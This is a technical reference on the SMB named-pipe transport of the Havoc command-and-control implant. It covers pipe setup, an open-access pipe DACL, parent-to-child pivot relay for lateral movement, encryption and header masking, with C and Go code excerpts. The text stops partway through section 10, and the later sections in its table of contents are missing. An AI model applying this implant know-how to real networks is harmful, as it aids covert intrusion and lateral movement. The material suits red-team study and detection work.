# SMB Demon — Deep Technical Analysis

This document is a low-level reference for the SMB Demon transport mechanism in Havoc. It covers every layer from named pipe creation through multi-hop task relay, encryption, and error handling.

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Build Configuration](#2-build-configuration)
3. [Data Structures](#3-data-structures)
4. [Named Pipe Mechanics](#4-named-pipe-mechanics)
5. [Agent Lifecycle](#5-agent-lifecycle)
6. [Registration Flow](#6-registration-flow)
7. [CommandDispatcher — SMB Mode](#7-commanddispatcher--smb-mode)
8. [Task Delivery: Teamserver → Parent → Child](#8-task-delivery-teamserver--parent--child)
9. [Output Relay: Child → Parent → Teamserver](#9-output-relay-child--parent--teamserver)
10. [PivotPush Mechanism](#10-pivotpush-mechanism)
11. [Wire Formats at Each Stage](#11-wire-formats-at-each-stage)
12. [Encryption Pipeline](#12-encryption-pipeline)
13. [Buffer Limits and Batching](#13-buffer-limits-and-batching)
14. [Keepalive and Disconnect Detection](#14-keepalive-and-disconnect-detection)
15. [Command and Subcommand IDs](#15-command-and-subcommand-ids)
16. [Teamserver-Side Processing](#16-teamserver-side-processing)
17. [Multi-Hop Pivot Chains](#17-multi-hop-pivot-chains)
18. [Error Handling](#18-error-handling)

---

## 1. Architecture Overview

An SMB Demon is a **child agent** that does not connect to the teamserver directly. All communication is relayed through a parent Demon using a Windows named pipe as the transport medium.

```
Teamserver (Go)
      │
      │  HTTP/HTTPS (parent's normal channel)
      │
  Parent Demon (HTTP)
      │
      │  Named Pipe  \\.\pipe\<pipename>   (PIPE_TYPE_MESSAGE)
      │
  SMB Child Demon (no direct network access required)
      │
      │  (can itself be a parent for deeper pivots)
      │
  SMB Grandchild Demon  (optional)
```

Key properties of this design:

- The SMB child has **no direct outbound TCP connection** — it is completely encapsulated in named pipe frames forwarded by its parent.
- All task encryption uses the child's own AES-256-CTR key, which the teamserver negotiated with the child via RSA-2048-OAEP at registration (HVC-005). The parent relay cannot decrypt child task content.
- The named pipe lives in the local system's pipe namespace. The parent and child can be on the same host, or the parent can connect over SMB/TCP to `\\<hostname>\pipe\<pipename>` on a remote host — covering lateral movement scenarios.
- Pivot chains can be arbitrarily deep. The teamserver wraps jobs in nested `COMMAND_PIVOT/DEMON_PIVOT_SMB_COMMAND` layers, one per hop.

---

## 2. Build Configuration

The entire SMB transport is gated behind the preprocessor flag `TRANSPORT_SMB`. When this flag is defined, the following are compiled in:

| File | Compiled content |
|------|-----------------|
| `src/core/TransportSmb.c` | `SmbSend`, `SmbRecv`, `SmbSecurityAttrOpen/Free` |
| `src/core/Pivot.c` | `PivotAdd`, `PivotRemove`, `PivotGet`, `PivotCount`, `PivotPush`, `PivotParseDemonID` |
| `src/core/Transport.c` | `SMBGetJob` (inside `#ifdef TRANSPORT_SMB`) |

When `TRANSPORT_SMB` is defined, the following code paths are **excluded** or altered:

- `PackageTransmitAll` skips the `DEMON_COMMAND_GET_JOB` wrapper if `Instance->Packages == NULL` (SMB has no polling — it only sends when it has data).
- `PackageTransmitAll`'s batch loop gains the tighter SMB size guard (`PIPE_BUFFER_MAX - AES_BLOCKLEN - HMAC_SHA256_SIZE`) to prevent pipe message splits (BUGFIX-003 BUG-D).
- `PackageTransmit` (single-package queue) discards oversized packages and substitutes a `DEMON_PACKAGE_DROPPED` error notification.
- `CommandDispatcher` uses `SMBGetJob` to receive tasks instead of the HTTP `PackageTransmitAll` + response parse path.

The HTTP and SMB transport paths are **mutually exclusive** in a single compiled binary.

---

## 3. Data Structures

### 3.1 PIVOT_DATA (Demon-side linked list node)

Defined in `include/Demon.h`. One node exists per connected SMB child:

```c
typedef struct _PIVOT_DATA {
    HANDLE   Handle;          // pipe handle (opened by PivotAdd via CreateFileW)
    DWORD    DemonID;         // child's agent ID (parsed from its registration packet)
    BUFFER   PipeName;        // wide-string pipe path (e.g. \\.\pipe\havoc_pipe)
    struct _PIVOT_DATA* Next; // singly-linked list
} PIVOT_DATA, *PPIVOT_DATA;
```

`Instance->SmbPivots` is the head of this linked list. It is maintained by:
- `PivotAdd()` — allocates and appends a new node
- `PivotRemove()` — unlinks and frees a node, closes the handle
- `PivotGet()` — linear scan by DemonID
- `PivotCount()` — returns list length

### 3.2 Relevant INSTANCE fields (SMB-specific)

```c
// Transport config (Config.Transport)
HANDLE Handle;    // named pipe handle for THIS agent (SMB child's server-side pipe)
LPWSTR Name;      // pipe name this child listens on

// Session
DWORD  AgentID;
BOOL   Connected;

// Linked list of outbound children
PPIVOT_DATA SmbPivots;  // parent's list of connected child pivots
```

### 3.3 Agent struct (Go/teamserver)

```go
type Agent struct {
    NameID     string       // hex AgentID, e.g. "deadbeef"
    JobQueue   []Job        // pending jobs to deliver to this agent
    Encryption struct {
        AESKey []byte
        AESIv  []byte
    }
    Pivots struct {
        Parent *Agent       // nil for direct (HTTP) agents; set for SMB children
        Links  []*Agent     // list of SMB children this agent relays for
    }
    Active bool
    ...
}
```

Pivot routing in the teamserver is determined entirely by `Pivots.Parent`:
- `nil` → direct agent, jobs go straight to `JobQueue`
- non-nil → SMB child, jobs are wrapped and forwarded to the root HTTP parent

---

## 4. Named Pipe Mechanics

### 4.1 Pipe Creation (child Demon — SmbSend)

The SMB child's named pipe is created **lazily on the first write attempt**, inside `SmbSend` in `TransportSmb.c`:

```c
BOOL SmbSend( PBUFFER Send )
{
    if ( ! Instance->Config.Transport.Handle )
    {
        // First call — create the server-side pipe
        Instance->Config.Transport.Handle = Instance->Win32.CreateNamedPipeW(
            Instance->Config.Transport.Name,   // e.g. \\.\pipe\havoc_smb
            PIPE_ACCESS_DUPLEX,                // bidirectional
            PIPE_TYPE_MESSAGE |                // message-mode (not byte-stream)
            PIPE_READMODE_MESSAGE |
            PIPE_WAIT,                         // blocking
            PIPE_UNLIMITED_INSTANCES,
            PIPE_BUFFER_MAX,                   // 0x10000 = 64 KB output buffer
            PIPE_BUFFER_MAX,                   // 64 KB input buffer
            0,                                 // default timeout
            &SecurityAttr                      // permissive DACL (see §4.3)
        );

        ConnectNamedPipe( Instance->Config.Transport.Handle, NULL );  // BLOCKS here
        return PipeWrite( Instance->Config.Transport.Handle, Send );
    }
    // Subsequent calls — pipe already exists, just write
    if ( ! PipeWrite( ... ) ) {
        SysNtClose( Instance->Config.Transport.Handle );
        Instance->Config.Transport.Handle = NULL;
        Instance->Session.Connected = FALSE;
        return FALSE;
    }
    return TRUE;
}
```

**Key points:**
- `ConnectNamedPipe(handle, NULL)` **blocks indefinitely** until a client connects. The child Demon is frozen at this point. No task processing, no sleep, no output — it just waits for the parent.
- Once a client connects, `PipeWrite` immediately delivers the registration packet (the MetaData package).
- `PIPE_TYPE_MESSAGE` means each `WriteFile` is a discrete message. A `ReadFile` call on the other end returns exactly one message at a time. If the read buffer is too small, `ReadFile` returns `ERROR_MORE_DATA`. This is why BUGFIX-003 BUG-D and BUGFIX-002 require correct allocation sizes.

### 4.2 Pipe Connection (parent Demon — PivotAdd)

When an operator issues a `pivot smb connect <pipename>` command to the parent, `PivotAdd` in `Pivot.c` is called:

```c
BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
{
    // Open client-side handle to the child's named pipe
    Handle = Instance->Win32.CreateFileW(
        NamedPipe.Buffer,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL
    );

    if ( NtGetLastError() == ERROR_PIPE_BUSY )
        Instance->Win32.WaitNamedPipeW( NamedPipe.Buffer, 5000 );

    // Poll until the child writes its registration packet
    do {
        if ( PeekNamedPipe( Handle, NULL, 0, NULL, BytesSize, NULL ) )
        {
            if ( *BytesSize > 0 ) {
                *Output = LocalAlloc( LPTR, *BytesSize );
                ReadFile( Handle, *Output, *BytesSize, BytesSize, NULL );
                break;
            }
        }
    } while ( TRUE );

    // Allocate PIVOT_DATA node and append to Instance->SmbPivots linked list
    Data->Handle  = Handle;
    Data->DemonID = PivotParseDemonID( *Output, *BytesSize );
    ...
}
```

`PivotParseDemonID` applies HVC-003 unmasking to extract the AgentID from the registration packet's outer header without a full parse, then returns it as the `DemonID` for this node.

### 4.3 Pipe Security Attributes

`SmbSecurityAttrOpen` in `TransportSmb.c` constructs a permissive DACL that allows **any user** to connect, including low-integrity processes:

- **DACL**: `Everyone` SID with `SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL`
- **SACL / mandatory label**: Low integrity label (`SECURITY_MANDATORY_LOW_RID`) so that low-integrity client processes can open the pipe without elevation

This is the same approach used by Meterpreter's named pipe pivot implementation. The rationale is that SMB pivots are typically used when the child runs in a constrained context and needs to communicate with a parent running at a different integrity level.

### 4.4 PipeWrite and PipeRead

These are thin wrappers (likely in `Win32.c` or inline) around `WriteFile` and `ReadFile` on the pipe handle. Because the pipe is in `PIPE_TYPE_MESSAGE` mode:

- `PipeWrite(handle, buffer)` → `WriteFile(handle, buf, len, ...)` → writes a complete message
- `PipeRead(handle, buffer)` → `ReadFile(handle, buf, buf->Length, ...)` → reads one complete message; if `buf->Length` is too small, returns `ERROR_MORE_DATA` and the message is partially consumed

This is why the allocation in `PivotPush` must be `(SIZE_field & 0x7FFFFFFF) + 4 + HMAC_SHA256_SIZE` — the SIZE field does not include itself (4 bytes) and does not include the HMAC tag (32 bytes), both of which `ReadFile` will include in the message.

---

## 5. Agent Lifecycle

```
DemonMain()
    │
    ├─ DemonInit()           — resolve Win32 APIs by hash, init syscall stubs
    ├─ DemonMetaData()       — build the registration MetaData package
    └─ DemonRoutine()        — enter main loop
           │
           ├─ if !Connected:
           │       TransportInit()   — write MetaData to pipe, block on ConnectNamedPipe
           │       if success: Connected = TRUE
           │
           └─ if Connected:
                   CommandDispatcher()   — main task loop (exits if Connected goes FALSE)
                   SleepObf()           — sleep between iterations
```

### 5.1 TransportInit — SMB path

```c
// Transport.c (TRANSPORT_SMB branch)
#ifdef TRANSPORT_SMB
    if ( PackageTransmitNow( Instance->MetaData, NULL, NULL ) == TRUE )
    {
        Instance->Session.Connected = TRUE;
        Success = TRUE;
    }
#endif
```

For SMB, `TransportInit` calls `PackageTransmitNow` (not `PackageTransmitAll`). `PackageTransmitNow` is the registration-packet transmitter. It:

1. Serialises the MetaData package (contains OS info, hostname, PID, architecture, AES key wrapped with RSA — see HVC-005)
2. Calls `TransportSend` → `SmbSend`
3. `SmbSend` creates the named pipe, blocks on `ConnectNamedPipe`, writes the MetaData packet to the pipe

If `SmbSend` succeeds (parent connected and packet written), `PackageTransmitNow` returns `TRUE` and the child sets `Connected = TRUE`.

**There is no acknowledgment from the parent back to the child at this point.** The child assumes it is connected the moment the write succeeds. Whether the parent successfully relayed the registration to the teamserver is opaque to the child.

### 5.2 Difference from HTTP registration

HTTP registration (`TransportInit` HTTP path):
- Sends MetaData, receives a response encrypted with the child's AES key
- Compares `AgentID` in the response to `Instance->Session.AgentID` to confirm the teamserver accepted the registration

SMB registration:
- Only checks `PipeWrite` success
- No server-side confirmation received by the child
- The child proceeds on the assumption that the parent will relay the packet

---

## 6. Registration Flow

Complete flow from child execution through teamserver acknowledgment:

```
[1] SMB Child: DemonMetaData() builds MetaData package
       Contains: [DEMON_INITIALIZE cmd][OS info][hostname][PID][arch]
                 [RSA-encrypted 48-byte session key material (HVC-005)]
                 [HVC-003 header mask applied]

[2] SMB Child: TransportInit() → PackageTransmitNow() → SmbSend()
       Creates named pipe \\.\pipe\<name>
       ConnectNamedPipe() — BLOCKS

[3] Parent Demon: Operator issues  pivot smb connect \\.\pipe\<name>
       CommandPivot(DEMON_PIVOT_SMB_CONNECT)
       → PivotAdd(pipename) → CreateFileW(pipename)
       → ReadFile() reads the MetaData packet from the pipe (child's SmbSend unblocks)

[4] Parent: PivotParseDemonID() extracts AgentID from MetaData (HVC-003 unmask)
       Allocates PIVOT_DATA node, sets DemonID, adds to Instance->SmbPivots

[5] Parent: PackageAddBytes(Package, Output, BytesSize)
       Builds COMMAND_PIVOT / DEMON_PIVOT_SMB_CONNECT response package
       Sends via its own PackageTransmit → HTTP to teamserver

[6] Teamserver: handleDemonAgent on parent's HTTP request
       Dispatches COMMAND_PIVOT → DEMON_PIVOT_SMB_CONNECT
       Calls ParseHeader(DemonData) on the child's raw registration bytes
       Checks AgentHdr.MagicValue == DEMON_MAGIC_VALUE

[7] If child is NEW:
       ParseDemonRegisterRequest(AgentHdr.AgentID, AgentHdr.Data, "", RSADecrypt)
           → RSA-decrypts the 256-byte ciphertext (HVC-005) to recover 48-byte key material
           → Sets DemonInfo.Encryption.AESKey (first 32 bytes)
           → Sets DemonInfo.Encryption.AESIv  (next 16 bytes)
       DemonInfo.Pivots.Parent = parentAgent
       parentAgent.Pivots.Links = append(Links, DemonInfo)
       teamserver.AgentAdd(DemonInfo)
       teamserver.AgentSendNotify(DemonInfo)   — shows agent in client UI

[8] If child is RECONNECTING (AgentID already known):
       Retrieves existing DemonInfo
       Updates DemonInfo.Active = true
       Re-sets DemonInfo.Pivots.Parent = parentAgent
       Appends to parentAgent.Pivots.Links
       teamserver.LinkAdd(parentAgent, DemonInfo)
```

After step 7/8 the child is fully registered in the teamserver. The child itself is not notified — it has been connected since step 3.

---

## 7. CommandDispatcher — SMB Mode

`CommandDispatcher` in `Command.c` is the main task loop. The SMB path differs substantially from HTTP:

```c
VOID CommandDispatcher( VOID )
{
    do {
        if ( ! Instance->Session.Connected ) break;

        SleepObf();                    // sleep + optional Ekko/Zilean obfuscation

        if ( ReachedKillDate() ) KillDate();
        if ( ! InWorkingHours() ) continue;

/* ---- SMB path ---- */
#ifdef TRANSPORT_SMB   // (actually the else of #ifdef TRANSPORT_HTTP)

        // Send all queued packages (task results, pivot output, etc.)
        PackageTransmitAll( NULL, NULL );

        // Read one incoming task block from the pipe (non-blocking if empty)
        if ( ! SMBGetJob( &DataBuffer, &DataBufferSize ) ) {
            PUTS( "SMBGetJob failed" )
            continue;    // retry after next sleep
        }

#endif
/* ---- end SMB path ---- */

        if ( DataBuffer && DataBufferSize > 0 ) {
            ParserNew( &Parser, DataBuffer, DataBufferSize );
            do {
                CommandID  = ParserGetInt32( &Parser );
                RequestID  = ParserGetInt32( &Parser );
                TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );

                Instance->CurrentRequestID = RequestID;

                if ( CommandID != DEMON_COMMAND_NO_JOB ) {
                    if ( TaskBufferSize != 0 ) {
                        ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                        ParserDecrypt( &TaskParser,
                                       Instance->Config.AES.Key,
                                       Instance->Config.AES.IV );  // static IV
                    }
                    // dispatch to DemonCommands[] function table
                    for ( UINT32 i = 0;; i++ ) {
                        if ( DemonCommands[i].Function == NULL ) break;
                        if ( DemonCommands[i].ID == CommandID ) {
                            DemonCommands[i].Function( &TaskParser );
                            break;
                        }
                    }
                }
            } while ( Parser.Length > 12 );

            MemSet( DataBuffer, 0, DataBufferSize );
            LocalFree( DataBuffer );
            DataBuffer = NULL;
            ParserDestroy( &Parser );
            ParserDestroy( &TaskParser );
        }
        // No else-break for SMB — empty reads are normal (pipe had no data)

        JobCheckList();     // check background job output
        PivotPush();        // relay output from any SMB children of THIS agent
        DownloadPush();     // push download chunks
        DotnetPush();       // push .NET output
        SocketPush();       // push SOCKS output

    } while ( TRUE );

    Instance->Session.Connected = FALSE;
}
```

### Key SMB differences from HTTP

| Aspect | HTTP | SMB |
|--------|------|-----|
| Get tasks | `PackageTransmitAll` sends GET_JOB, response = tasks | `SMBGetJob` reads from pipe (tasks pushed by parent) |
| Send results | Same `PackageTransmitAll` (sends + receives in one call) | `PackageTransmitAll(NULL,NULL)` sends only, no receive |
| Empty response | Triggers retry loop | No response expected — just continue |
| Failure on send | Host checkup, retry or `CommandExit` | `SmbSend` sets `Connected=FALSE`, dispatcher exits loop |
| Polling model | Push-pull (Demon asks for jobs) | Push-only (parent pushes jobs to child) |

### SMBGetJob

```c
// Transport.c
BOOL SMBGetJob( PVOID* RecvData, PSIZE_T RecvSize )
{
    BUFFER Resp = { 0 };

    *RecvData = NULL;
    *RecvSize = 0;

    if ( SmbRecv( &Resp ) ) {
        *RecvData = Resp.Buffer;
        *RecvSize = Resp.Length;
        return TRUE;
    }
    return FALSE;
}
```

`SmbRecv` uses `PeekNamedPipe` first — if nothing is in the pipe, it returns TRUE with `Resp.Buffer = NULL` and `Resp.Length = 0`. The dispatcher checks `DataBuffer && DataBufferSize > 0` before processing, so an empty read is a no-op.

### SmbRecv — detailed read sequence

```c
BOOL SmbRecv( PBUFFER Resp )
{
    if ( PeekNamedPipe( Handle, NULL, 0, NULL, &BytesSize, NULL ) )
    {
        if ( BytesSize > sizeof(UINT32) + sizeof(UINT32) )  // at least 8 bytes
        {
            // Step 1: Read 4-byte DemonID framing field
            ReadFile( Handle, &DemonId, sizeof(UINT32), &BytesSize, NULL );

            // [HVC-008] Unmask: DemonId ^ HEADER_MASK_SEED
            DemonId ^= HEADER_MASK_SEED;   // 0xA3F1C2B4

            // Verify this packet is for us
            if ( Instance->Session.AgentID != DemonId ) {
                Resp->Buffer = NULL;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            // Step 2: Read 4-byte PackageSize framing field
            ReadFile( Handle, &PackageSize, sizeof(UINT32), &BytesSize, NULL );

            // [HVC-008] Unmask: PackageSize ^ (HEADER_MASK_SEED >> 8)
            PackageSize ^= ( HEADER_MASK_SEED >> 8 );  // 0x00A3F1C2

            // Step 3: Allocate and read payload
            Resp->Buffer = LocalAlloc( LPTR, PackageSize );
            if ( ! Resp->Buffer ) {
                Instance->Session.Connected = FALSE;
                return FALSE;          // BUGFIX-003 BUG-C: NULL guard
            }
            Resp->Length = PackageSize;

            PipeRead( Handle, Resp );  // ReadFile for PackageSize bytes
        }
    }
    else {
        Instance->Session.Connected = FALSE;  // PeekNamedPipe failure = disconnected
        return FALSE;
    }
    return TRUE;
}
```

---

## 8. Task Delivery: Teamserver → Parent → Child

This is the downward path — the teamserver wants to send a task to an SMB child.

### 8.1 Step 1: AddJobToQueue (Go, teamserver)

When the operator sends a command targeting the SMB child:

```go
func (a *Agent) AddJobToQueue(job Job) []Job {
    if a.Pivots.Parent != nil {
        // SMB child — route through parent
        a.PivotAddJob(job)
    } else {
        // Direct agent — add directly
        a.JobQueue = append(a.JobQueue, job)
    }
    return a.JobQueue
}
```

### 8.2 Step 2: PivotAddJob — encryption and wrapping

```go
func (a *Agent) PivotAddJob(job Job) {
    // Encrypt job with CHILD's AES key — parent cannot decrypt this
    Payload = BuildPayloadMessage([]Job{job}, a.Encryption.AESKey, a.Encryption.AESIv)
    // Payload format: [CMD(4)][REQID(4)][EncLen(4)][AES-encrypted task data]
    //                  (encrypted with child's static AES key/IV)

    // Frame: [ChildAgentID(4)][PayloadLen(4)][Payload bytes]
    Packer.AddInt32(int32(ChildAgentID))
    Packer.AddBytes(Payload)

    PivotJob = Job{
        Command: COMMAND_PIVOT,       // 0x9D8 = 2520
        Data: []interface{}{
            DEMON_PIVOT_SMB_COMMAND,  // 12
            uint32(ChildAgentID),
            Packer.Buffer(),          // [ChildAgentID][PayloadLen][Payload]
        },
    }

    // If multi-hop: wrap PivotJob again in another COMMAND_PIVOT layer
    // (see §17 for multi-hop details)

    // Add to ROOT parent's JobQueue (the direct HTTP agent)
    pivots.Parent.JobQueue = append(pivots.Parent.JobQueue, PivotJob)
}
```

`BuildPayloadMessage` output format (for one job):
```
[CMD        4 bytes LE]
[REQID      4 bytes LE]
[DATA_SIZE  4 bytes LE]
[AES-encrypted data  ...]
```
Encryption uses `a.Encryption.AESKey` + `a.Encryption.AESIv` (child's **static** IV — no per-request IV in the TS→Demon direction).

### 8.3 Step 3: Parent receives COMMAND_PIVOT

When the parent HTTP Demon checks in to the teamserver, it may receive a `COMMAND_PIVOT / DEMON_PIVOT_SMB_COMMAND` job. `CommandDispatcher` parses it and dispatches to `CommandPivot`. The `DEMON_PIVOT_SMB_COMMAND` branch:

```c
case DEMON_PIVOT_SMB_COMMAND:
{
    UINT32 DemonId  = ParserGetInt32( Parser );       // ChildAgentID
    Data.Buffer     = ParserGetBytes( Parser, &Data.Length );
    // Data = [ChildAgentID(4)][PayloadLen(4)][Payload]
    // ^^^ This is Packer.Buffer() from PivotAddJob

    // [HVC-008] Mask the framing header before writing to pipe
    if ( Data.Buffer && Data.Length >= 8 ) {
        MemCopy( &FrameId,   Data.Buffer,     4 );  // ChildAgentID
        MemCopy( &FrameSize, Data.Buffer + 4, 4 );  // PayloadLen
        FrameId   ^= HEADER_MASK_SEED;              // 0xA3F1C2B4
        FrameSize ^= ( HEADER_MASK_SEED >> 8 );     // 0x00A3F1C2
        MemCopy( Data.Buffer,     &FrameId,   4 );
        MemCopy( Data.Buffer + 4, &FrameSize, 4 );
    }

    // Find child's pipe handle in SmbPivots linked list
    PivotData = /* scan Instance->SmbPivots for DemonId */;

    PipeWrite( PivotData->Handle, &Data );  // write to child's named pipe
    PackageDestroy( Package );
    return;   // no response back to teamserver for this subcommand
}
```

### 8.4 Step 4: Child reads from pipe (SmbRecv)

The child's `CommandDispatcher` calls `SMBGetJob` → `SmbRecv`:

1. `PeekNamedPipe` detects data
2. Reads 4 bytes → masked `FrameId` → unmask → `DemonId` → verify == `Session.AgentID`
3. Reads 4 bytes → masked `FrameSize` → unmask → `PackageSize`
4. Reads `PackageSize` bytes → the raw `Payload` from `BuildPayloadMessage`

### 8.5 Step 5: Child decrypts and dispatches

Back in `CommandDispatcher`:

```c
ParserNew( &Parser, DataBuffer, DataBufferSize );
// DataBuffer = [CMD(4)][REQID(4)][EncLen(4)][AES data...]

CommandID  = ParserGetInt32( &Parser );   // e.g. DEMON_COMMAND_FS
RequestID  = ParserGetInt32( &Parser );
TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );  // AES-encrypted task args

ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
ParserDecrypt( &TaskParser,
               Instance->Config.AES.Key,   // child's own AES key
               Instance->Config.AES.IV );  // child's static IV

DemonCommands[i].Function( &TaskParser );  // e.g. CommandFS()
```

`ParserDecrypt` decrypts in-place using AES-256-CTR with the child's static IV. After decryption `TaskParser` contains the raw task arguments.

---

## 9. Output Relay: Child → Parent → Teamserver

This is the upward path — the child has produced output and needs to deliver it to the teamserver.

### 9.1 Step 1: Child queues output

Command handlers (e.g. `CommandFS`, `CommandProc`) call:
```c
PPACKAGE Package = PackageCreate( DEMON_COMMAND_FS );
PackageAddBytes( Package, OutputData, OutputSize );
PackageTransmit( Package );   // queues Package into Instance->Packages list
```

For SMB, `PackageTransmit` checks the package size against `PIPE_BUFFER_MAX` (64 KB). Oversized packages are discarded and replaced with a `DEMON_PACKAGE_DROPPED` error:
```c
#if TRANSPORT_SMB
    if ( sizeof(UINT32)*8 + Package->Length > PIPE_BUFFER_MAX ) {
        // Replace with DEMON_PACKAGE_DROPPED notification
    }
#endif
```

### 9.2 Step 2: PackageTransmitAll builds and encrypts the wire packet

At the top of the next `CommandDispatcher` iteration, `PackageTransmitAll(NULL, NULL)` is called. It:

1. **Short-circuit if nothing to send**: For SMB, if `Instance->Packages == NULL`, return `TRUE` immediately (no GET_JOB wrapper needed).

2. **Build base packet**: Creates a `PackageCreateWithMetaData(DEMON_COMMAND_GET_JOB)` wrapper. For SMB this is still built but the outer header (SIZE, MAGIC, AgentID, CMD, REQID) serves as framing for the pipe.

3. **Batch packages** (SMB size guard):
   ```c
   while ( Pkg ) {
       if ( Package->Length + sizeof(UINT32)*3 + Pkg->Length
            + AES_BLOCKLEN + HMAC_SHA256_SIZE > PIPE_BUFFER_MAX )
           break;   // batch is full
       // append Pkg to Package
       Pkg = Pkg->Next;
   }
   ```
   Limit: `PIPE_BUFFER_MAX - 48 = 65488 bytes` usable payload to ensure `AuthWireLength <= PIPE_BUFFER_MAX`.

4. **LZNT1 compression (HVC-007)**: If payload > 256 bytes, compress via `RtlCompressBuffer`. Set bit 31 of the SIZE field to signal compression. Skip compression for `DEMON_INITIALIZE` packets.

5. **Per-request random IV (HVC-004)**:
   ```c
   UCHAR RandIV[16];
   RandIV[0..3]   = __builtin_bswap32( RandomNumber32() );  // big-endian
   RandIV[4..7]   = __builtin_bswap32( RandomNumber32() );
   RandIV[8..11]  = __builtin_bswap32( RandomNumber32() );
   RandIV[12..15] = __builtin_bswap32( RandomNumber32() );
   ```
   Initialise `AesCtx` with this fresh IV, encrypt payload region.

6. **Build WireBuffer**:
   ```
   WireBuffer = [Package header (Padding bytes)] [RandIV (16 bytes)] [AES-encrypted payload]
   ```
   Update SIZE field in WireBuffer to reflect `WireLength - 4` (bytes after SIZE) with optional bit-31 compression flag.

7. **HVC-003 header mask**:
   ```c
   mask = WireSize ^ HEADER_MASK_SEED;   // WireSize = bytes 0-3 of WireBuffer
   // XOR bytes 4-19 of WireBuffer with mask (4-byte repeating)
   ```

8. **HMAC-SHA256 (HVC-006)**:
   ```c
   macKey = HMAC(AES_key, "mac");
   tag    = HMAC(macKey, WireBuffer, WireLength);  // over full masked wire buffer
   AuthWireBuffer = [WireBuffer || tag];            // append 32-byte tag
   ```

9. **Transmit**: `TransportSend( AuthWireBuffer, AuthWireLength, NULL, NULL )` → `SmbSend` → `PipeWrite`.

The parent's `PivotPush` will read this `AuthWireBuffer` from the pipe.

### 9.3 Step 3: Parent reads output — PivotPush

After its own `CommandDispatcher` iteration, the parent calls `PivotPush()`. This scans every child in `Instance->SmbPivots` and drains available data:

```c
// PivotPush (Pivot.c)
for each TempList in Instance->SmbPivots {
    NumLoops = 0;
    do {
        PeekNamedPipe( TempList->Handle, NULL, 0, NULL, &BytesSize, NULL );
        if ( BytesSize >= sizeof(UINT32) ) {
            // Peek the first 4 bytes = raw big-endian SIZE field
            PeekNamedPipe( TempList->Handle, &Length, sizeof(UINT32), ... );

            // [HVC-007] Strip bit 31 (compression flag) before computing alloc size
            // [BUGFIX-002] Add 4 (SIZE field itself) + HMAC_SHA256_SIZE (32)
            RawSize = __builtin_bswap32( Length );
            AllocLen = (RawSize & 0x7FFFFFFF) + 4 + HMAC_SHA256_SIZE;

            Output = LocalAlloc( LPTR, AllocLen );
            ReadFile( TempList->Handle, Output, AllocLen, &BytesSize, NULL );

            // Wrap in COMMAND_PIVOT / DEMON_PIVOT_SMB_COMMAND
            Package = PackageCreate( DEMON_COMMAND_PIVOT );
            PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );
            PackageAddBytes( Package, Output, BytesSize );
            PackageTransmit( Package );     // queue for next HTTP send

            LocalFree( Output );
        }
        NumLoops++;
    } while ( NumLoops < MAX_SMB_PACKETS_PER_LOOP );  // batch limit per pivot
}
```

The packet read from the pipe is the child's **complete AuthWireBuffer** (header + IV + encrypted payload + HMAC). It is forwarded opaquely — the parent does not decrypt or modify it.

### 9.4 Step 4: Parent delivers to teamserver

The parent's next HTTP checkin calls `PackageTransmitAll`. The queued `COMMAND_PIVOT` packages are bundled with the GET_JOB wrapper, encrypted with the **parent's** AES key, and sent over HTTP to the teamserver. The parent's encryption wraps the opaque child payload as a nested blob.

### 9.5 Step 5: Teamserver unpacks and processes

In `handleDemonAgent`, after the parent's outer encryption is stripped (HVC-004, HVC-006, HVC-003, HVC-007), the teamserver dispatches `COMMAND_PIVOT → DEMON_PIVOT_SMB_COMMAND`:

```go
case DEMON_PIVOT_SMB_COMMAND:
    Package = Parser.ParseBytes()    // = child's AuthWireBuffer (raw)

    // Probe copy to identify the child agent
    probeCopy = copy(Package)
    probeHdr, probeErr = ParseHeader(probeCopy)

    // [HVC-006] Strip HMAC tail if child is known
    if probeErr == nil &&
       probeHdr.MagicValue == DEMON_MAGIC_VALUE &&
       teamserver.AgentExist(probeHdr.AgentID) &&
       len(Package) > 32 {
        parseData = Package[:len(Package)-32]    // strip last 32 bytes
    } else {
        parseData = Package
    }

    // Full header parse (HVC-003 unmask happens inside ParseHeader)
    AgentHdr, err = ParseHeader(parseData)

    PivotAgent = teamserver.AgentInstance(AgentHdr.AgentID)
    PivotAgent.UpdateLastCallback(teamserver)   // update last-seen timestamp

    // [HVC-004] Extract per-request IV and decrypt
    first_iter := true
    for AgentHdr.Data.CanIRead([ReadInt32, ReadInt32]) {
        Command = AgentHdr.Data.ParseInt32()
        Request = AgentHdr.Data.ParseInt32()

        if first_iter {
            first_iter = false
            PacketIV := AgentHdr.Data.ParseAtLeastBytes(16)
            AgentHdr.Data.DecryptBuffer(PivotAgent.Encryption.AESKey, PacketIV)

            // [HVC-007] Decompress if bit 31 was set
            if AgentHdr.Compressed {
                decompressed = crypt.DecompressLZNT1(AgentHdr.Data.Buffer())
                AgentHdr.Data = parser.NewParser(decompressed)
            }
        }

        if Command != COMMAND_GET_JOB {
            Parser = parser.NewParser(AgentHdr.Data.ParseBytes())
            PivotAgent.TaskDispatch(Request, Command, Parser, teamserver)
        }
        // COMMAND_GET_JOB from SMB child = child has no output, just alive
    }
```

---

## 10. PivotPush Mechanism

`PivotPush` is the heartbeat of the relay. It is called at the **end of every CommandDispatcher iteration** in the parent, immediately after `JobCheckList()`.

### What it does

1. Iterates the singly-linked `Instance->SmbPivots` list
2. For each child, polls `PeekNamedPipe` for available data
3. If data is present: reads the packet, wraps it in `COMMAND_PIVOT/DEMON_PIVOT_SMB_COMMAND`, queues it for the parent's next HTTP send
4. Loops up to `MAX_SMB_PACKETS_PER_LOOP` times per child to drain bursts
5. On `ERROR_BROKEN_PIPE`: removes the pivot from the list, sends `COMMAND_PIVOT/DEMON_PIVOT_SMB_DISCONNECT` to the teamserver

### Timing relationship

```
[Parent sleep] → SleepObf()
[Parent HTTP send+recv] → PackageTransmitAll (sends results + receives new tasks)
[Process tasks] → CommandDispatcher inner loop
[Check background jobs] → JobCheckList()
[Drain child pipes] → PivotPush()       ← child output appears here
[Queue download chunks] → DownloadPush()
